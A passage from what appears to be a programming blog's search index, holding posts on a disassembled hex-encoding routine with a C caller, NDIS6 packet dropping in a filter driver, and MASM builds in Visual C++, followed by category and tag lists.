sub_40B444 sub_40B444 proc near ; CODE XREF: sub_40CCEA+A4p;Source = byte ptr -14h;var_4 = dword ptr -4;arg_0 = dword ptr 8;arg_4 = dword ptr 0Ch;arg_8 = dword ptr 10h push ebp mov ebp, esp sub esp, 14h mov eax, dword ptr ___security_cookie ; &quot;N鍬? xor eax, ebp mov [ebp-4], eax push ebx mov ebx, [ebp+8] push esi mov esi, [ebp+10h] push edi xor edi, edi cmp [ebp+0Ch], edi mov byte ptr [esi], 0 jbe short loc_40B48Eloc_40B467: ; CODE XREF: sub_40B444+48j movzx eax, byte ptr [ebx+edi] push eax lea eax, [ebp-14h] push offset a02x_0 ; &quot;%02X&quot; push eax ; Dest call sprintf lea eax, [ebp-14h] push eax ; Source push esi ; Dest call strcat add esp, 14h inc edi cmp edi, [ebp+0Ch] jb short loc_40B467loc_40B48E: ; CODE XREF: sub_40B444+21j mov ecx, [ebp-4] pop edi pop esi xor ecx, ebp leave retnsub_40B444 endpend The sample code is as follows: 123456789101112131415161718192021222324#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;extern &quot;C&quot; &#123; char* sub_40B444(char*,int,char*);&#125;int _tmain(int argc, _TCHAR* argv[])&#123; char* pszBuf = new char[1024]; memset( pszBuf , 0 , 1024 ); strcpy_s( pszBuf , 1024 , &quot;des:&quot; ); sub_40B444( &quot;你总是说我在，这样孤单时候，才能想起与你联络&quot; , strlen(&quot;你总是说我在，这样孤单时候，才能想起与你联络&quot;) , pszBuf ); printf_s( &quot;format string : %s\\n&quot; , &quot;你总是说我在，这样孤单时候，才能想起与你联络&quot; ); printf_s( &quot;format string : %s\\n&quot; , pszBuf ); if( pszBuf != NULL ) &#123; delete[]pszBuf; pszBuf = NULL; &#125; return 0;&#125;","categories":[{"name":"Asm","slug":"Asm","permalink":"http://example.com/categories/Asm/"},{"name":"windows","slug":"Asm/windows","permalink":"http://example.com/categories/Asm/windows/"}],"tags":[{"name":"inline","slug":"inline","permalink":"http://example.com/tags/inline/"},{"name":"asm","slug":"asm","permalink":"http://example.com/tags/asm/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/tags/C-C/"}]},{"title":"NDIS6 how to drop packets","slug":"ndis6DropPackage","date":"2009-07-15T02:29:18.000Z","updated":"2023-10-17T16:02:49.880Z","comments":true,"path":"2009/07/14/ndis6DropPackage/","link":"","permalink":"http://example.com/2009/07/14/ndis6DropPackage/","excerpt":"","text":"In ndis6 how to drop packets? in FilterSendNetBufferLists: 1234567891011121314FILTER_RELEASE_LOCK(&amp;pFilter-&gt;Lock, DispatchLevel);//DEBUGP(DL_TRACE, (&quot;&lt;===SendNetBufferList [CheckPacket] drop this packet. \\n&quot;)); CurrNbl = NetBufferLists;while (CurrNbl)&#123; NET_BUFFER_LIST_STATUS(CurrNbl) = NDIS_STATUS_MEDIA_DISCONNECTED ; CurrNbl = NET_BUFFER_LIST_NEXT_NBL(CurrNbl);&#125;NdisFSendNetBufferListsComplete(pFilter-&gt;FilterHandle,NetBufferLists,DispatchLevel ? NDIS_SEND_COMPLETE_FLAGS_DISPATCH_LEVEL : 0);break; in FilterReceiveNetBufferLists: 12345678910111213FILTER_RELEASE_LOCK(&amp;pFilter-&gt;Lock, DispatchLevel);if (NDIS_TEST_RECEIVE_CAN_PEND(ReceiveFlags))&#123; ReturnFlags = 0; if (NDIS_TEST_RECEIVE_AT_DISPATCH_LEVEL(ReceiveFlags)) &#123; NDIS_SET_RETURN_FLAG(ReturnFlags, NDIS_RETURN_FLAGS_DISPATCH_LEVEL); &#125; NdisFReturnNetBufferLists(pFilter-&gt;FilterHandle, NetBufferLists, ReturnFlags);&#125;break;","categories":[{"name":"Kernel","slug":"Kernel","permalink":"http://example.com/categories/Kernel/"},{"name":"windows","slug":"Kernel/windows","permalink":"http://example.com/categories/Kernel/windows/"},{"name":"ndis6","slug":"Kernel/windows/ndis6","permalink":"http://example.com/categories/Kernel/windows/ndis6/"}],"tags":[{"name":"ndis6","slug":"ndis6","permalink":"http://example.com/tags/ndis6/"},{"name":"kernel","slug":"kernel","permalink":"http://example.com/tags/kernel/"},{"name":"firewall","slug":"firewall","permalink":"http://example.com/tags/firewall/"}]},{"title":"In a VC (Visual C++) project, how to compile with an assembly language file","slug":"compileAssemblyFile","date":"2009-01-04T04:29:12.000Z","updated":"2023-10-17T03:46:12.284Z","comments":true,"path":"2009/01/03/compileAssemblyFile/","link":"","permalink":"http://example.com/2009/01/03/compileAssemblyFile/","excerpt":"","text":"It include four steps: Add the assembly language file to the project. In the Solution Explorer window, right-click the Visual C++ project, choose “Build Customizations…”, and a dialog box labeled “Visual C++ Build Customization Files” will pop up. Check the “masm” option and click OK. At this point, in the Configuration Property, you can see “Microsoft Macro Assembler.“ Right-click the assembly language file, select “Properties,” go to “Custom Build Step,” and then “General.” In the “Command Line“ field on the right, input: 1ml.exe /c /D&quot;X86&quot; /D&quot;DEBUG&quot; /Fo&quot;$(IntDir)/$(InputName).obj&quot; $(InputFileName) In the “Outputs“ field, input: 1$(IntDir)/$(InputName).obj Don’t forget to add the path to ml.exe to the environment variable “PATH.”","categories":[{"name":"Asm","slug":"Asm","permalink":"http://example.com/categories/Asm/"},{"name":"windows","slug":"Asm/windows","permalink":"http://example.com/categories/Asm/windows/"}],"tags":[{"name":"inline","slug":"inline","permalink":"http://example.com/tags/inline/"},{"name":"asm","slug":"asm","permalink":"http://example.com/tags/asm/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/tags/C-C/"}]}],"categories":[{"name":"Angular from Beginner to Hero","slug":"Angular-from-Beginner-to-Hero","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/"},{"name":"(1) Setting up the Local Environment and Workspace","slug":"Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace/"},{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"Unit Test","slug":"Go/Unit-Test","permalink":"http://example.com/categories/Go/Unit-Test/"},{"name":"nil","slug":"Go/nil","permalink":"http://example.com/categories/Go/nil/"},{"name":"panic() and recover()","slug":"Go/panic-and-recover","permalink":"http://example.com/categories/Go/panic-and-recover/"},{"name":"defer","slug":"Go/defer","permalink":"http://example.com/categories/Go/defer/"},{"name":"Closure and Anonymous Function","slug":"Go/Closure-and-Anonymous-Function","permalink":"http://example.com/categories/Go/Closure-and-Anonymous-Function/"},{"name":"go func()","slug":"Go/go-func","permalink":"http://example.com/categories/Go/go-func/"},{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"Practical Tools","slug":"Penetration-Test/Practical-Tools","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/"},{"name":"Socat","slug":"Penetration-Test/Practical-Tools/Socat","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/Socat/"},{"name":"Netcat","slug":"Penetration-Test/Practical-Tools/Netcat","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/Netcat/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"MySQL Stack-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection/"},{"name":"HTTP Header SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection/"},{"name":"MySQL Error-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection/"},{"name":"DNS Log Blind SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection/"},{"name":"Time-Based Blind SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection/"},{"name":"Boolean Blind Sql Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection/"},{"name":"Union Sql Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/"},{"name":"Search-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection/"},{"name":"Character-based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection/"},{"name":"Numeric-based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Numeric-based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Numeric-based-SQL-Injection/"},{"name":"System Architecture","slug":"System-Architecture","permalink":"http://example.com/categories/System-Architecture/"},{"name":"Plugin Pattern","slug":"System-Architecture/Plugin-Pattern","permalink":"http://example.com/categories/System-Architecture/Plugin-Pattern/"},{"name":"shellcode","slug":"Penetration-Test/shellcode","permalink":"http://example.com/categories/Penetration-Test/shellcode/"},{"name":"Asm","slug":"Asm","permalink":"http://example.com/categories/Asm/"},{"name":"linux","slug":"Asm/linux","permalink":"http://example.com/categories/Asm/linux/"},{"name":"hash","slug":"Penetration-Test/hash","permalink":"http://example.com/categories/Penetration-Test/hash/"},{"name":"About information_schema","slug":"Penetration-Test/MySQL/About-information-schema","permalink":"http://example.com/categories/Penetration-Test/MySQL/About-information-schema/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/categories/C-C/"},{"name":"Others","slug":"Others","permalink":"http://example.com/categories/Others/"},{"name":"float data","slug":"Others/float-data","permalink":"http://example.com/categories/Others/float-data/"},{"name":"windows","slug":"Asm/windows","permalink":"http://example.com/categories/Asm/windows/"},{"name":"Kernel","slug":"Kernel","permalink":"http://example.com/categories/Kernel/"},{"name":"windows","slug":"Kernel/windows","permalink":"http://example.com/categories/Kernel/windows/"},{"name":"ndis6","slug":"Kernel/windows/ndis6","permalink":"http://example.com/categories/Kernel/windows/ndis6/"}],"tags":[{"name":"go","slug":"go","permalink":"http://example.com/tags/go/"},{"name":"shellcode","slug":"shellcode","permalink":"http://example.com/tags/shellcode/"},{"name":"nasm","slug":"nasm","permalink":"http://example.com/tags/nasm/"},{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"hash","slug":"hash","permalink":"http://example.com/tags/hash/"},{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"},{"name":"asm","slug":"asm","permalink":"http://example.com/tags/asm/"},{"name":"float","slug":"float","permalink":"http://example.com/tags/float/"},{"name":"binary","slug":"binary","permalink":"http://example.com/tags/binary/"},{"name":"inline","slug":"inline","permalink":"http://example.com/tags/inline/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/tags/C-C/"},{"name":"ndis6","slug":"ndis6","permalink":"http://example.com/tags/ndis6/"},{"name":"kernel","slug":"kernel","permalink":"http://example.com/tags/kernel/"},{"name":"firewall","slug":"firewall","permalink":"http://example.com/tags/firewall/"}]}